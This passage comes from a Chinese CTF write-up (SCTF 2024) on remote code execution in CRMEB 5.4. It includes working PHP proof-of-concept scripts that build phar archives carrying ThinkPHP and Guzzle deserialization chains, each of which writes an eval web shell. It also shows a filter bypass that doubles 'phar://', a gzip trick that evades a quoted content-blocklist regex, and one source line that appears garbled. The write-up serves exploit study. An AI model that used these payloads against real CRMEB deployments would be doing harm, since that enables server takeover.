    <span class="token string single-quoted-string">'application/vnd.ms-works'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/vnd.ms-excel'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/zip'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/vnd.ms-excel'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/vnd.ms-excel'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'text/xml'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/x-icon'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/vnd.microsoft.icon'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/x-x509-ca-cert'</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>白名单后缀和文件类型</p>
<p>后台有 admin 的登录界面，不过 hint 告诉我们是前台rce</p>
<p>审一下源码，先从 api 功能开始，从刚才的上传接口那里入手，观察和文件相关的操作</p>
<p>crmeb&#x2F;app&#x2F;api&#x2F;controller&#x2F;v1&#x2F;PublicController.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
     * 获取图片base64
     * @param Request $request
     * @return mixed
     */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_image_base64</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token punctuation">[</span><span class="token variable">$imageUrl</span><span class="token punctuation">,</span> <span class="token variable">$codeUrl</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">postMore</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
        <span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageUrl</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.*(\.png|\.jpg|\.jpeg|\.gif)$/'</span><span class="token punctuation">,</span> <span class="token variable">$imageUrl</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$imageUrl</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$codeUrl</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.*(\.png|\.jpg|\.jpeg|\.gif)$/'</span><span class="token punctuation">,</span> <span class="token variable">$codeUrl</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'https://mp.weixin.qq.com/cgi-bin/showqrcode'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">remember</span><span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$codeTmp</span> <span class="token operator">=</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$codeUrl</span> <span class="token operator">?</span> <span class="token function">image_to_base64</span><span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">false</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$codeTmp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$putCodeUrl</span> <span class="token operator">=</span> <span class="token function">put_image</span><span class="token punctuation">(</span><span class="token variable">$codeUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$putCodeUrl</span> <span class="token operator">?</span> <span class="token function">image_to_base64</span><span class="token punctuation">(</span><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">request</span><span class="token operator">-></span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$putCodeUrl</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">false</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$putCodeUrl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"DOCUMENT_ROOT"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$putCodeUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">remember</span><span class="token punctuation">(</span><span class="token variable">$imageUrl</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$imageUrl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$imageTmp</span> <span class="token operator">=</span> <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token variable">$imageUrl</span> <span class="token operator">?</span> <span class="token function">image_to_base64</span><span class="token punctuation">(</span><span class="token variable">$imageUrl</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">false</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$imageTmp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$putImageUrl</span> <span class="token operator">=</span> <span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$imageUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token variable">$putImageUrl</span> <span class="token operator">?</span> <span class="token function">image_to_base64</span><span class="token punctuation">(</span><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">request</span><span class="token operator">-></span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$putImageUrl</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">false</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$putImageUrl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"DOCUMENT_ROOT"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$putImageUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$image</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token function">compact</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">100005</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x2F;api&#x2F;image_base64 这里会接受两个参数 code 和 image</p>
<p>逻辑是先检查给定的 url 是否是一张图片，然后先尝试从缓存中获取图片，如果失败则调用<code>put_image</code>从远程下载图片，再转成base64</p>
<p>注意，因为这里缓存机制的存在，同一个图片只能触发一次 if 内的条件</p>
<p>这里需要重点关注一下<code>put_image</code>这个函数，跟过去看一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">put_image</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ext</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"png"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ext</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">.</span> <span class="token variable">$ext</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">//文件保存路径</span>
        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uploads/qrcode'</span><span class="token punctuation">;</span>
        <span class="token variable">$fp2</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp2</span><span class="token punctuation">,</span> <span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一点图片后缀检测，然后对<code>phar://</code>进行置空，接着调用<code>readfile</code>远程读取文件，再保存到 uploads&#x2F;qrcode 下</p>
<p>既然是用<code>str_replace</code>置空<code>phar://</code>，那么直接双写绕过即可，于是在<code>readfile</code>这里就能打一个<code>phar://</code>文件包含</p>
<p>那么，我们只需要控制前面的 code 参数为 phar 协议即可</p>
<p>这样子思路就很清晰了：在上传头像处上传图片马，内容是tp的反序列化链，通过 phar 文件包含来解析这个图片马从而触发反序列化实现rce</p>
<p>接下来就是找tp链子了，crmeb-5.4是基于 tp6 的，那么就是用tp6的链子，写文件的话，安装这个框架的时候会发现 public 目录一定是可写的</p>
<p>我这里是逆向搜索链子，从tp6的链子尾部开始往前找，貌似没啥变化，甚至是tp6.0的链子（后面发现我改的链子只控制 data 和 withAttr 打不了。。这里的是正确修改的poc）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST[1]);?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"/var/www/public/myshell.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现有文件内容检测，看一下</p>
<p>crmeb&#x2F;crmeb&#x2F;services&#x2F;upload&#x2F;storage&#x2F;Local.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/think|php|log|phar|Socket|Channel|Flysystem|Psr6Cache|Cached|Request|debug|Psr6Cachepool|eval/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'文件内容不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>怎么办呢，可以用gzip绕过，将<code>1.phar</code>改名为<code>1.jpg</code>，再给压缩</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">gzip</span> <span class="token number">1</span>.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到1.jpg.gz，再次上传</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003232155586.png" alt="image-20241003232155586"></p>
<p>得到路径：<code>http://1.95.73.253/uploads/store/comment/20241003/2ee7c3e7993a6dfda10943ddd8a81d6e.jpg</code></p>
<p>现在去使用phar伪协议解析这个马，用绝对路径</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003232533258.png" alt="image-20241003232533258"></p>
<p>喜报：链子不对，请少侠重新来过</p>
<p>这里试图拿wm的链子打FileCookieJar</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>FileCookieJar</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>SetCookie</span><span class="token punctuation">;</span>

<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileCookieJar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'public/shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval(filter_input(INPUT_POST,a)); ?>'</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SetCookie</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'foo'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Value"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Domain'</span> <span class="token operator">=></span> <span class="token variable">$payload</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"a"</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'bar'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Expires'</span> <span class="token operator">=></span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"__HALT_COMPILER();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>失败了。。</p>
<p>再尝试拿星盟的链子打PhpSpreadsheet</p>
